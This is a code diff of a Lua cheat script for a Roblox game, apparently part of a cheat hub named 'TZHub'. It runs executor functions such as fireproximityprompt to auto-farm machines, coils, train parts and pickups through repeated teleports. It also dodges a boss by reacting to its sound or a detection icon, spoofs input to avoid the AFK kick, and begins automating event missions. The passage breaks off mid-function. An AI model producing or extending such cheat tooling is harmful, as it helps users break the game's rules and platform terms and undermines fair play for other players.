+                local amtLabelAfter = getAmountLabel()
+                if not amtLabelAfter then break end
+                local curAfter, totAfter = parseAmountText(amtLabelAfter.Text)
+                if curAfter and totAfter and curAfter > curCheck then
+                    dbg("autoTrainParts: collected one -> " .. tostring(curAfter) .. "/" .. tostring(totAfter))
+                    collectedThisPass = true
+                    break
+                end
+            until (tick() - startTick) >= maxWait
+
+            if releaseLock then releaseLock("collect") end
+            task.wait(0.12); beat()
+
+            if collectedThisPass then break end
+        end
+
+        -- final check for completion
+        local amtLabelFinal = getAmountLabel()
+        if amtLabelFinal then
+            local curFinal, totFinal = parseAmountText(amtLabelFinal.Text)
+            if curFinal and totFinal and curFinal >= totFinal then
+                dbg("autoTrainParts: collection complete: " .. tostring(curFinal) .. "/" .. tostring(totFinal))
+                local safeZone = workspace:FindFirstChild("Persistent")
+                    and workspace.Persistent:FindFirstChild("Zones")
+                    and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+                if safeZone then pcall(function() hrp.CFrame = safeZone.CFrame + Vector3.new(0, 5, 0) end) end
+                break
+            end
+        end
+
+        if not collectedThisPass then
+            task.wait(0.6); beat()
+        end
+    end
+
+    -- ensure flag cleared so autoFarm can continue
+    autoTrainPartsEnabled = false
+    dbg("autoTrainParts: loop ended")
+end
+
+-- Worker wrapper that runs the one-shot collector in its own thread
+local function autoTrainPartsWorker(hrp)
+    local ok, err = pcall(function() autoTrainPartsOnce(hrp) end)
+    if not ok then dbg("autoTrainPartsWorker error: " .. tostring(err)) end
+    autoTrainPartsEnabled = false
+    autoTrainThread = nil
+    dbg("autoTrainPartsWorker: finished")
+end
+
+local function startAutoTrainParts()
+    if autoTrainPartsEnabled then return end
+    autoTrainPartsEnabled = true
+    if autoTrainThread then return end
+    autoTrainThread = task.spawn(function()
+        local char = player.Character or player.CharacterAdded:Wait()
+        local hrp = char and char:WaitForChild("HumanoidRootPart")
+        if not hrp then
+            autoTrainPartsEnabled = false
+            autoTrainThread = nil
+            return
+        end
+        autoTrainPartsWorker(hrp)
+    end)
+    dbg("autoTrainParts: started (worker)")
+end
+
+
+
+-- Auto Train SafeZone
+local function autoTrainSafeZone(hrp)
+    local interacts = workspace:FindFirstChild("Interacts")
+    if not interacts or not hrp then return end
+    for _, machine in ipairs(interacts:GetChildren()) do
+        if machine.Name == "ItemCollection" then continue end
+        local vfx = machine:FindFirstChild("VFX")
+        if vfx and #vfx:GetChildren() > 0 then
+            return
+        end
+    end
+    local safeZone = workspace:FindFirstChild("Persistent")
+        and workspace.Persistent:FindFirstChild("Zones")
+        and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+    if safeZone then hrp.CFrame = safeZone.CFrame + Vector3.new(0, 5, 0) end
+end
+
+-- ===== Improved Coil Helpers (replace existing block) =====
+
+-- make coilLastFired a weak-key table so entries don't leak
+coilLastFired = coilLastFired or {}
+setmetatable(coilLastFired, { __mode = "k" })
+
+local function canFireCoil(coil)
+    if not coil or not coil:IsA("BasePart") then return false end
+
+    -- throttle per coil
+    local last = coilLastFired[coil]
+    if last and (tick() - last) < coilPerCoilDelay then
+        return false
+    end
+
+    -- proximity prompt must exist
+    local prompt = coil:FindFirstChildOfClass("ProximityPrompt")
+    if not prompt then return false end
+
+    -- attribute-based state (preferred if map sets it)
+    local attr = coil.GetAttribute and coil:GetAttribute("State")
+    if attr == "used" or attr == "blue" then return false end
+
+    -- visual color fallback: avoid blue-ish parts (tweak thresholds if needed)
+    local visual = coil:FindFirstChild("Visual") or coil
+    if visual and visual:IsA("BasePart") and visual.Color then
+        local c = visual.Color
+        if c.B > 0.7 and c.R < 0.45 and c.G < 0.65 then
+            return false
+        end
+    end
+
+    return true
+end
+
+local function markFired(coil)
+    if not coil then return end
+    coilLastFired[coil] = tick()
+end
+
+local function fireCoilSafely(hrp, coil)
+    -- returns true on success, false on failure
+    if not coil or not coil:IsA("BasePart") then return false end
+    if not canFireCoil(coil) then return false end
+
+    hrp = hrp or safeGetHRP()
+    if not hrp then return false end
+
+    -- move near coil safely (pcall to avoid errors)
+    pcall(function()
+        local ok, cf, size = pcall(function() return coil:GetBoundingBox() end)
+        if ok and cf then
+            hrp.CFrame = cf + Vector3.new(0, (size.Y/2) + 2, 0)
+        else
+            hrp.CFrame = coil.CFrame + Vector3.new(0, 3, 0)
+        end
+    end)
+    task.wait(0.12)
+
+    -- ensure humanoid ready and attempt
+    ensureHumanoidReady()
+    safeFirePrompt(coil:FindFirstChildOfClass("ProximityPrompt"))
+
+    -- wait for server to accept (coil becomes non-activatable)
+    local t0 = tick()
+    local accepted = false
+    while (tick() - t0) < coilTimeout do
+        task.wait(0.12)
+        if not canFireCoil(coil) then
+            accepted = true
+            break
+        end
+    end
+
+    if accepted then
+        markFired(coil)
+        return true
+    end
+
+    -- retry once with small recovery
+    pcall(function() hrp.CFrame = hrp.CFrame + Vector3.new(0, 3, 0) end)
+    task.wait(0.18)
+    safeFirePrompt(coil:FindFirstChildOfClass("ProximityPrompt"))
+    task.wait(0.6)
+    if not canFireCoil(coil) then
+        markFired(coil)
+        return true
+    end
+
+    return false
+end
+
+local function fireAllCoilsControlled(hrp)
+    local coilFolder = workspace:FindFirstChild("Map")
+        and workspace.Map:FindFirstChild("Interact")
+        and workspace.Map.Interact:FindFirstChild("TeslaCoil")
+        and workspace.Map.Interact.TeslaCoil:FindFirstChild("CoilActivators")
+    if not coilFolder then return end
+
+    local groups = {"Middle Coils","Platform 2","Platform 3","Platform 4"}
+    for _, groupName in ipairs(groups) do
+        if not coilEnabled then return end
+        local group = coilFolder:FindFirstChild(groupName)
+        if not group then continue end
+
+        -- cooperative lock: yield if another system holds it
+        if acquireLock then
+            if not acquireLock("coil", 3) then task.wait(0.2); continue end
+        end
+
+        local firedThisPass = 0
+        for _, coil in ipairs(group:GetDescendants()) do
+            if not coilEnabled then break end
+            if coil:IsA("BasePart") and canFireCoil(coil) then
+                local ok, err = pcall(function()
+                    local success = fireCoilSafely(hrp, coil)
+                    if success then firedThisPass = firedThisPass + 1 end
+                end)
+                if not ok then dbg("fireAllCoilsControlled: error firing coil: "..tostring(err)) end
+
+                if firedThisPass >= (TESLA_PASS_LIMIT or 3) then break end
+                task.wait(coilPerCoilDelay)
+            end
+        end
+
+        if releaseLock then releaseLock("coil") end
+        task.wait(coilGroupDelay)
+    end
+
+    -- teleport to safe zone at the end
+    local safeZone = workspace.Persistent and workspace.Persistent:FindFirstChild("Zones") and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+    if safeZone and hrp then pcall(function() hrp.CFrame = safeZone.CFrame + Vector3.new(0, 5, 0) end) end
+end
+
+-- ===== end improved coil helpers =====
+local function isTimerVisible()
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then return false end
+
+    local gameUI = gui:FindFirstChild("GameUI")
+    if not gameUI then return false end
+
+    local hud = gameUI:FindFirstChild("HUD")
+    if not hud then return false end
+
+    local timer = hud:FindFirstChild("Timer")
+    if not timer then return false end
+
+    return timer.Visible == true
+end
+-- ============================
+-- CONSTANTS / GLOBALS
+-- ============================
+local MACHINE_ATTEMPT_TIMEOUT = MACHINE_ATTEMPT_TIMEOUT or 10.0
+
+local emergencyActive = false
+local inDangerZone = false
+
+-- ============================
+-- SAFE ZONE PART HELPER
+-- ============================
+local function getTrainSafeZonePart()
+    local persistent = workspace:FindFirstChild("Persistent")
+    if not persistent then return nil end
+
+    local zones = persistent:FindFirstChild("Zones")
+    if not zones then return nil end
+
+    local safe = zones:FindFirstChild("TrainSafeZone")
+    if not safe then return nil end
+
+    if safe:IsA("BasePart") then
+        return safe
+    end
+
+    return safe:FindFirstChildWhichIsA("BasePart", true)
+end
+
+-- ============================
+-- TELEPORT FUNCTIONS
+-- ============================
+local function teleportToSafeZone(hrp)
+    local part = getTrainSafeZonePart()
+    if not part or not hrp then return false end
+
+    pcall(function()
+        hrp.CFrame = part.CFrame + Vector3.new(0, 5, 0)
+    end)
+
+    return true
+end
+
+local function teleportToDelivery(hrp)
+    if not hrp then return end
+
+    local dp = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("DeliveryPoint")
+    if not dp then return end
+
+    local part = dp:IsA("BasePart") and dp or dp:FindFirstChildWhichIsA("BasePart", true)
+    if part then
+        pcall(function()
+            hrp.CFrame = part.CFrame + Vector3.new(0, 5, 0)
+        end)
+    end
+end
+
+local function teleportInside(inst, hrp)
+    if not inst or not hrp then return end
+
+    local part = inst:IsA("BasePart") and inst or inst:FindFirstChildWhichIsA("BasePart", true)
+
+    if part then
+        pcall(function()
+            hrp.CFrame = part.CFrame
+        end)
+    else
+        local ok, cf = pcall(function() return inst:GetBoundingBox() end)
+        if ok and cf then
+            pcall(function()
+                hrp.CFrame = cf
+            end)
+        end
+    end
+end
+
+local function teleportUnder(inst, hrp)
+    if not inst or not hrp then return end
+
+    local ok, cf, size = pcall(function()
+        return inst:GetBoundingBox()
+    end)
+
+    if ok and cf and size then
+        pcall(function()
+            hrp.CFrame = cf - Vector3.new(0, size.Y/2 + 2, 0)
+        end)
+    end
+end
+
+-- ============================
+-- TIMER CHECK
+-- ============================
+local function isTimerVisible()
+    local gui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+    if not gui then return false end
+
+    local gameUI = gui:FindFirstChild("GameUI")
+    local hud = gameUI and gameUI:FindFirstChild("HUD")
+    local timer = hud and hud:FindFirstChild("Timer")
+
+    return timer and timer.Visible
+end
+
+-- ============================
+-- AUTO FARM LOOP (SMART)
+-- ============================
+local function autoFarmLoop()
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+
+    local function getMachines()
+        local interacts = workspace:FindFirstChild("Interacts")
+        return interacts and interacts:GetChildren() or {}
+    end
+
+    local function getActiveVFX()
+        local active = {}
+        for _, machine in ipairs(getMachines()) do
+            if machine.Name ~= "ItemCollection" then
+                local vfx = machine:FindFirstChild("VFX")
+                if vfx and #vfx:GetChildren() > 0 then
+                    table.insert(active, vfx)
+                end
+            end
+        end
+        return active
+    end
+
+    while autoFarm do
+        task.wait(0.1)
+
+        if emergencyActive then
+            task.wait(0.5)
+            continue
+        end
+
+        local enemies = workspace:FindFirstChild("Enemies")
+        local meistro = enemies and enemies:FindFirstChild("RejectMeistro")
+
+        local timerActive = isTimerVisible()
+
+        -- ================= TIMER OFF → TRAIN =================
+        -- ================= TIMER OFF → LOOP TRAIN TP =================
+-- ================= TIMER CHECK =================
+if isTimerVisible() then
+    while autoFarm and isTimerVisible() do
+        if emergencyActive then break end
+
+        teleportToSafeZone(hrp)
+        task.wait(0.25)
+    end
+
+    continue
+end
+
+        -- ================= FIND MACHINES =================
+        local activeVFX = getActiveVFX()
+
+        -- if no machines → wait for new ones
+        if #activeVFX == 0 then
+            task.wait(1)
+            continue
+        end
+
+        -- ================= MACHINE LOOP =================
+        for _, vfx in ipairs(activeVFX) do
+            if not autoFarm then break end
+
+            local machine = vfx.Parent
+            local prompt = machine
+                and machine:FindFirstChild("Interaction")
+                and machine.Interaction:FindFirstChildOfClass("ProximityPrompt")
+
+            -- 🔥 TELEPORT LOOP (MAX 3s)
+            local tpStart = tick()
+            while autoFarm and tick() - tpStart < 3 do
+                if emergencyActive then break end
+                if not isTimerVisible() then break end
+
+                if meistro then
+                    teleportUnder(vfx, hrp)
+                else
+                    teleportInside(vfx, hrp)
+                end
+
+                task.wait(0.15)
+            end
+
+            -- 🔥 FIRE PROMPT LOOP UNTIL SUCCESS
+            local fired = false
+            local fireStart = tick()
+
+            while autoFarm and vfx and #vfx:GetChildren() > 0 do
+                if emergencyActive then break end
+                if not isTimerVisible() then break end
+                if tick() - fireStart > MACHINE_ATTEMPT_TIMEOUT then break end
+
+                if prompt then
+                    safeFirePrompt(prompt)
+                    fired = true
+                end
+
+                if fired then break end
+
+                task.wait(0.15)
+            end
+
+            -- 🔥 AFTER FIRE → WAIT VFX CLEAR OR SWITCH
+            local waitStart = tick()
+            while autoFarm and vfx do
+                if emergencyActive then break end
+
+                -- if finished → go next
+                if #vfx:GetChildren() == 0 then
+                    break
+                end
+
+                -- if timer ended → go train
+                if not isTimerVisible() then
+                    break
+                end
+
+                -- small reposition
+                if meistro then
+                    teleportUnder(vfx, hrp)
+                else
+                    teleportInside(vfx, hrp)
+                end
+
+                if tick() - waitStart > 3 then
+                    break
+                end
+
+                task.wait(0.2)
+            end
+        end
+    end
+
+    autoFarmThread = nil
+end
+
+-- ============================
+-- MEISTRO SOUND SYSTEM
+-- ============================
+local function getHRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function forceTeleportToTrain()
+    local hrp = getHRP()
+    local part = getTrainSafeZonePart()
+
+    if hrp and part then
+        pcall(function()
+            hrp.CFrame = part.CFrame + Vector3.new(0, 5, 0)
+        end)
+    end
+end
+
+task.spawn(function()
+    while true do
+        task.wait(0.2)
+
+        local hrp = getHRP()
+        local boss = workspace:FindFirstChild("Enemies")
+            and workspace.Enemies:FindFirstChild("RejectMeistro")
+
+        if hrp and boss then
+            local part = boss:FindFirstChildWhichIsA("BasePart", true)
+            if part then
+                local dist = (hrp.Position - part.Position).Magnitude
+                inDangerZone = dist < 80
+            else
+                inDangerZone = false
+            end
+        else
+            inDangerZone = false
         end
     end
 end)
 
-Options.BookColor:OnChanged(function()
-    for _, h in pairs(Highlights) do
-        if h then
-            h.FillColor = Options.BookColor.Value
-            h.OutlineColor = Options.BookColor.Value
+local function handleSound(sound)
+    if not sound:IsA("Sound") then return end
+
+    local id = tostring(sound.SoundId)
+    if not id:find("109012207545757") then return end
+
+    sound.Played:Connect(function()
+        if not autoFarm or not inDangerZone or emergencyActive then return end
+
+        emergencyActive = true
+        forceTeleportToTrain()
+        task.wait(5)
+        emergencyActive = false
+    end)
+end
+
+for _, obj in ipairs(workspace:GetDescendants()) do
+    handleSound(obj)
+end
+
+workspace.DescendantAdded:Connect(handleSound)
+
+-- ============================
+-- START / STOP
+-- ============================
+local function startAutoFarm()
+    if autoFarm then return end
+    autoFarm = true
+    if autoFarmThread then return end
+    autoFarmThread = task.spawn(autoFarmLoop)
+end
+
+local function stopAutoFarm()
+    autoFarm = false
+    autoFarmThread = nil
+end
+---hide
+local function startAutoHide()
+    if autoHide then return end
+    autoHide = true
+    if autoHideThread then return end
+    autoHideThread = task.spawn(function()
+        while autoHide do
+            task.wait(0.5)
+            local char = player.Character or player.CharacterAdded:Wait()
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if not hrp then continue end
+
+            local gui = player:FindFirstChild("PlayerGui")
+            local detectedIcon = gui and gui:FindFirstChild("GameUI") and gui.GameUI:FindFirstChild("HUD") and gui.GameUI.HUD:FindFirstChild("DetectedFrame") and gui.GameUI.HUD.DetectedFrame:FindFirstChild("DetectedIcon")
+            if detectedIcon and detectedIcon.Visible then
+                local prevAutoFarm = autoFarm
+                local prevAutoTrain = autoTrainPartsEnabled
+                autoFarm = false
+                autoTrainPartsEnabled = false
+
+                local originalCFrame = hrp.CFrame
+                local safeZone = workspace.Persistent and workspace.Persistent:FindFirstChild("Zones") and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+                if safeZone then
+                    hrp.CFrame = safeZone.CFrame + Vector3.new(0, 5, 0)
+                    task.wait(hideDuration)
+                    hrp.CFrame = originalCFrame
+                else
+                    task.wait(hideDuration)
+                end
+
+                autoFarm = prevAutoFarm
+                autoTrainPartsEnabled = prevAutoTrain
+            end
         end
+        autoHideThread = nil
+    end)
+end
+
+local function stopAutoHide()
+    autoHide = false
+    autoHideThread = nil
+end
+
+
+
+
+
+
+-- Aggro visualizer helpers
+local function createAggroSphere(radius)
+    if aggroSpherePart and aggroSpherePart.Parent then aggroSpherePart:Destroy() end
+    local part = Instance.new("Part")
+    part.Name = "TZHub_AggroSphere"
+    part.Anchored = true
+    part.CanCollide = false
+    part.Transparency = 0.6
+    part.Size = Vector3.new(radius*2, 1, radius*2)
+    part.Material = Enum.Material.Neon
+    part.Color = Color3.fromRGB(255, 80, 80)
+    part.CastShadow = false
+    part.Parent = workspace
+    aggroSpherePart = part
+end
+
+local function updateAggroSphere()
+    if not aggroSpherePart then return end
+    local char = player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    local r = aggroRadius
+    aggroSpherePart.Size = Vector3.new(r*2, 1, r*2)
+    aggroSpherePart.CFrame = CFrame.new(hrp.Position - Vector3.new(0, hrp.Size and hrp.Size.Y/2 or 2, 0))
+end
+
+local function showAggroVisualizerFunc()
+    if showAggroVisualizer then return end
+    showAggroVisualizer = true
+    createAggroSphere(aggroRadius)
+    task.spawn(function()
+        while showAggroVisualizer do
+            updateAggroSphere()
+            task.wait(0.06)
+        end
+        if aggroSpherePart then pcall(function() aggroSpherePart:Destroy() end) end
+        aggroSpherePart = nil
+    end)
+end
+
+local function hideAggroVisualizerFunc()
+    showAggroVisualizer = false
+end
+
+-- Safe AutoFarm Toggle (fixes nil collectAllPickups error)
+-- Place this after your WindUI MainTab is created.
+
+-- Local helper: collect pickups (Stuffing then Event)
+local function collectAllPickupsImpl(hrp)
+    if not hrp then return end
+    local pickupRoot = workspace:FindFirstChild("Pickup")
+    if not pickupRoot then return end
+
+    local function collectFolder(folder)
+        if not folder then return end
+        for _, item in ipairs(folder:GetChildren()) do
+            if not autoFarm then return end
+            if not item.Parent then continue end
+            if not (item:IsA("Model") or item:IsA("BasePart")) then continue end
+
+            local ok, cf, size = pcall(function() return item:GetBoundingBox() end)
+            if ok and cf then
+                local target = cf + Vector3.new(0, (size and size.Y or 2)/2 + DESIRED_UP_DISTANCE, 0)
+                pcall(function() hrp.CFrame = target end)
+            else
+                if item:IsA("BasePart") and item.CFrame then
+                    pcall(function() hrp.CFrame = item.CFrame + Vector3.new(0, item.Size.Y/2 + DESIRED_UP_DISTANCE, 0) end)
+                else
+                    task.wait(PICKUP_STEP_WAIT)
+                    continue
+                end
+            end
+
+            local prompt = item:FindFirstChildWhichIsA("ProximityPrompt", true)
+            if prompt then
+                pcall(function() safeFirePrompt(prompt) end)
+            else
+                firePrompts(item)
+            end
+
+            task.wait(PICKUP_STEP_WAIT)
+        end
+    end
+
+    collectFolder(pickupRoot:FindFirstChild("Stuffing"))
+    collectFolder(pickupRoot:FindFirstChild("Event"))
+end
+
+-- Expose a safe callable wrapper (so existing code can call collectAllPickups)
+local function collectAllPickups(hrp)
+    if type(collectAllPickupsImpl) == "function" then
+        pcall(function() collectAllPickupsImpl(hrp) end)
+    else
+        dbg("collectAllPickups: implementation missing")
+    end
+end
+
+-- =========================
+-- SERVICES
+-- =========================
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function getHRP()
+	local char = workspace:WaitForChild("Characters"):WaitForChild(tostring(player.UserId))
+	return char:WaitForChild("HumanoidRootPart")
+end
+
+local HRP
+task.spawn(function()
+	while true do
+		pcall(function() HRP = getHRP() end)
+		task.wait(1)
+	end
+end)
+
+local Interacts      = workspace:WaitForChild("Interacts")
+local StuffingFolder = workspace:WaitForChild("Pickup"):WaitForChild("Stuffing")
+local TimerUI        = player:WaitForChild("PlayerGui"):WaitForChild("GameUI"):WaitForChild("HUD"):WaitForChild("Timer")
+local SafeZone       = workspace:WaitForChild("Persistent"):WaitForChild("Zones"):WaitForChild("TrainSafeZone")
+
+-- =========================
+-- SETTINGS
+-- =========================
+local offset  = -5
+local Enabled = false
+
+-- =========================
+-- HELPERS
+-- =========================
+local function Freeze(state)
+	local char = workspace:FindFirstChild("Characters")
+		and workspace.Characters:FindFirstChild(tostring(player.UserId))
+	local hum = char and char:FindFirstChildOfClass("Humanoid")
+	if hum then
+		hum.WalkSpeed = state and 0 or 16
+		hum.JumpPower = state and 0 or 50
+	end
+end
+
+local function TPUnder(part)
+	if HRP then
+		HRP.CFrame = part.CFrame * CFrame.new(0, offset, 0)
+	end
+end
+
+local function FirePrompts(obj)
+	for _, v in pairs(obj:GetDescendants()) do
+		if v:IsA("ProximityPrompt") then
+			pcall(function() fireproximityprompt(v, 0) end)
+		end
+	end
+end
+
+local function GetPart(obj)
+	if obj:IsA("BasePart") or obj:IsA("MeshPart") then return obj end
+	return obj:FindFirstChildWhichIsA("MeshPart", true)
+		or obj:FindFirstChildWhichIsA("BasePart", true)
+end
+
+-- =========================
+-- TRAIN PARTS (MeshPart fix)
+-- =========================
+local function CollectTrainParts()
+	local folder = workspace:FindFirstChild("Interacts")
+		and workspace.Interacts:FindFirstChild("ItemCollection")
+	local delivery = workspace:FindFirstChild("Map")
+		and workspace.Map:FindFirstChild("DeliveryPoint")
+
+	if not folder or not delivery then return false end
+
+	while Enabled do
+		local found = false
+
+		for _, item in ipairs(folder:GetChildren()) do
+			if not Enabled then break end
+			if not item.Parent then continue end
+			if item.Name == "ItemCollectionHighlight" then continue end
+
+			local prompt = item:FindFirstChildWhichIsA("ProximityPrompt", true)
+			if not prompt or not prompt.Enabled then continue end
+
+			local part = item:IsA("BasePart") and item
+				or item:FindFirstChildWhichIsA("MeshPart", true)
+				or item:FindFirstChildWhichIsA("BasePart", true)
+
+			if not part then continue end
+
+			found = true
+
+			-- 🔁 LOOP until AlignOrientation appears
+			local collected = false
+			local start = tick()
+
+			while Enabled and item.Parent do
+				if HRP then
+					HRP.CFrame = part.CFrame * CFrame.new(0, 3, 0)
+				end
+
+				pcall(function()
+					fireproximityprompt(prompt, 0)
+				end)
+
+				-- ✅ CHECK: collected or not
+				if item:FindFirstChild("AlignOrientation", true) then
+					collected = true
+					break
+				end
+
+				if tick() - start > 2 then break end -- safety
+				task.wait(0.001)
+			end
+
+			-- 🚚 ONLY TP if actually collected
+			if collected and HRP then
+				HRP.CFrame = delivery.CFrame * CFrame.new(0, 3, 0)
+				task.wait(0.1)
+			end
+		end
+
+		-- ❌ no items → SafeZone
+		if not found then
+			if HRP then
+				HRP.CFrame = SafeZone.CFrame * CFrame.new(0, 3, 0)
+			end
+			task.wait(0.2)
+		end
+
+		task.wait(0.001)
+	end
+
+	return true
+end
+-- =========================
+-- COILS (fixed)
+-- =========================
+local firedCoils = {}
+
+local function DoCoils()
+	local map = workspace:FindFirstChild("Map")
+	if not map then return false end
+
+	local safeZone = workspace:FindFirstChild("Persistent")
+		and workspace.Persistent:FindFirstChild("Zones")
+		and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+
+	if not safeZone then return false end
+
+	local coilRoot = map:FindFirstChild("Interact", true)
+		and map.Interact:FindFirstChild("TeslaCoil", true)
+		and map.Interact.TeslaCoil:FindFirstChild("CoilActivators", true)
+
+	if not coilRoot then return false end
+
+	local function getCoilsWithPrompt()
+		local list = {}
+
+		for _, obj in ipairs(coilRoot:GetDescendants()) do
+			if obj.Name == "Coil" then
+				local prompt = obj:FindFirstChildWhichIsA("ProximityPrompt", true)
+				if prompt and prompt.Enabled and prompt.Parent then
+					local part = obj:IsA("BasePart") and obj
+						or obj:FindFirstChildWhichIsA("MeshPart", true)
+						or obj:FindFirstChildWhichIsA("BasePart", true)
+
+					if part then
+						table.insert(list, {
+							obj = obj,
+							part = part,
+							prompt = prompt
+						})
+					end
+				end
+			end
+		end
+
+		return list
+	end
+
+	while Enabled do
+		local coils = getCoilsWithPrompt()
+
+		-- ❌ no coils → SafeZone + wait + rescan
+		if #coils == 0 then
+			if HRP then
+				HRP.CFrame = safeZone.CFrame * CFrame.new(0, 3, 0)
+			end
+			task.wait(0.3)
+
+			-- if whole system disappeared → still SafeZone loop
+			if not coilRoot or not coilRoot.Parent then
+				HRP.CFrame = safeZone.CFrame * CFrame.new(0, 3, 0)
+				return false
+			end
+
+			continue
+		end
+
+		-- =========================
+		-- PROCESS COILS ONE BY ONE
+		-- =========================
+		for _, coil in ipairs(coils) do
+			if not Enabled then break end
+			if not coil.obj.Parent then continue end
+
+			local start = tick()
+
+			while Enabled and coil.obj.Parent and coil.prompt.Parent do
+				if HRP then
+					HRP.CFrame = coil.part.CFrame * CFrame.new(0, 3, 0)
+				end
+
+				pcall(function()
+					fireproximityprompt(coil.prompt, coil.prompt.HoldDuration or 0)
+				end)
+
+				task.wait(0.01)
+
+				if tick() - start > 2 then break end
+			end
+
+			task.wait(0.05)
+		end
+
+		task.wait(0.05)
+	end
+
+	return true
+end
+
+-- =========================
+-- MACHINE HANDLER
+-- =========================
+local function HandleMachine(machine)
+
+	if machine:FindFirstChild("Golden_Machine") then
+		machine = machine:FindFirstChild("Golden_Machine")
+	end
+
+	local vfx = machine:FindFirstChild("VFX")
+	if not vfx or #vfx:GetChildren() == 0 then return end
+
+	local base = machine:FindFirstChild("BaseMachine")
+	if not base then return end
+
+	local cylinder = base:FindFirstChild("Cylinder.270")
+		or base:FindFirstChildWhichIsA("BasePart")
+
+	if not cylinder then return end
+
+	while Enabled and vfx and vfx.Parent and #vfx:GetChildren() > 0 do
+		if HRP then
+			HRP.CFrame = cylinder.CFrame * CFrame.new(0, -2, 0)
+		end
+
+		Freeze(true)
+		FirePrompts(machine)
+
+		task.wait(0.001)
+	end
+
+	Freeze(false)
+end
+
+-- =========================
+-- MAIN LOOP
+-- =========================
+local function run()
+
+	-- TIMER SAFEZONE
+	task.spawn(function()
+		local last = false
+		while Enabled do
+			if TimerUI.Visible then
+				if not last then
+					for i = 1, 3 do
+						if HRP then
+							HRP.CFrame = SafeZone.CFrame * CFrame.new(0, 3, 0)
+						end
+						task.wait(0.05)
+					end
+				end
+				last = true
+			else
+				last = false
+			end
+			task.wait(0.1)
+		end
+	end)
+
+	-- STUFFING
+	task.spawn(function()
+		offset = -4
+		for _, v in pairs(StuffingFolder:GetChildren()) do
+			if not Enabled then break end
+			local part = GetPart(v)
+			if part then
+				repeat
+					TPUnder(part)
+					FirePrompts(v)
+					task.wait(0.001)
+				until not v.Parent or not Enabled
+			end
+		end
+	end)
+
+	while Enabled do
+
+		-- 1st: TRAIN PARTS
+		if CollectTrainParts() then
+			task.wait(0.05)
+			continue
+		end
+
+		-- 2nd: COILS
+		local didCoil = DoCoils()
+
+		-- 3rd: MACHINES
+		if not didCoil then
+
+			for _, machine in pairs(Interacts:GetChildren()) do
+				if not Enabled then break end
+				if machine.Name == "ItemCollection" then continue end
+				HandleMachine(machine)
+			end
+
+			-- ToughMachine → Golden_Machine
+			local thirdChild = Interacts:GetChildren()[3]
+			if thirdChild then
+				local toughMachine = thirdChild:FindFirstChild("ToughMachine")
+				if toughMachine then
+					local goldenMachine = toughMachine:FindFirstChild("Golden_Machine")
+					if goldenMachine then
+						HandleMachine(goldenMachine)
+					end
+				end
+			end
+		end
+
+		if not didCoil and HRP then
+			HRP.CFrame = SafeZone.CFrame * CFrame.new(0, 3, 0)
+		end
+
+		task.wait(0.001)
+	end
+
+end
+
+-- =========================
+-- TOGGLE
+-- =========================
+local thread
+
+MainTab:Toggle({
+	Title = "Auto Farm",
+	Desc = "Do I have to explain?",
+	Value = false,
+	Callback = function(state)
+		Enabled = state
+		if Enabled then
+			if not thread then
+				thread = task.spawn(function()
+					run()
+					thread = nil
+				end)
+			end
+		end
+	end
+})
+local Players = game:GetService("Players")
+local VirtualUser = game:GetService("VirtualUser")
+
+local player = Players.LocalPlayer
+local antiAfkEnabled = false
+
+-- Anti AFK logic
+player.Idled:Connect(function()
+    if antiAfkEnabled then
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new())
     end
 end)
 
-local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu", "wrench")
+-- MainTab Toggle
+local AntiAFKToggle = MainTab:Toggle({
+    Title = "Anti AFK",
+    Desc = "Prevents AFK kick",
+    Icon = "shield",
+    Type = "Checkbox",
+    Value = false,
 
-MenuGroup:AddLabel("Menu key")
-    :AddKeyPicker("MenuKeybind", {
-        Default = "RightShift",
-        NoUI = true
+    Callback = function(state)
+        antiAfkEnabled = state
+        print("Anti AFK:", state and "Enabled" or "Disabled")
+    end
+})
+local Players = game:GetService("Players")
+local player  = Players.LocalPlayer
+local VIM     = game:GetService("VirtualInputManager")
+
+local KeplieEnabled    = false
+local KeplieThread     = nil
+local MissionBlacklist = {}
+
+local MISSION_ID_MAP = {
+	["Don't be spotted by any rejects"]            = "K_HIDE_AND_SEEK",
+	["Don't run out of Stamina"]                   = "K_TUBULAR",
+	["Let yourself be hit exactly once"]           = "K_PORES",
+	["Fail all your skillchecks"]                  = "K_TEARS",
+	["Have a completely random speed stat"]        = "K_DOPPLER",
+	["Reset to 1 HP every zone"]                   = "K_SPAGHETTI",
+	["Survive with no sprint"]                     = "K_LOSS",
+	["Survive with 10 Stamina"]                    = "K_MAGNIFIER",
+	["Lose 2 HP every second whilst being chased"] = "K_HALOS",
+	["Survive with 10 Stealth"]                    = "K_SIREN_SONG",
+}
+
+local function getHRP()
+	local char = workspace:FindFirstChild("Characters")
+		and workspace.Characters:FindFirstChild(tostring(player.UserId))
+	return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function findAllKepliePrompts()
+	local results = {}
+	local segments = workspace:FindFirstChild("Map")
+		and workspace.Map:FindFirstChild("Segments")
+	if not segments then return results end
+
+	for _, seg in ipairs(segments:GetChildren()) do
+		local hole = seg:FindFirstChild("KeplieHole")
+		if not hole then continue end
+		for _, child in ipairs(hole:GetChildren()) do
+			if child.Name == "KeplieRoot" then
+				for _, desc in ipairs(child:GetDescendants()) do
+					if desc:IsA("ProximityPrompt") then
+						local part = desc.Parent
+						while part and not part:IsA("BasePart") do
+							part = part.Parent
+						end
+						if part then
+							table.insert(results, {prompt = desc, part = part})
+						end
+					end
+				end
+			end
+		end
+	end
+
+	return results
+end
+
+local function getActiveMissionId()
+	local ok, result = pcall(function()
+		local ui = player.PlayerGui:FindFirstChild("EasterChallengeUI")
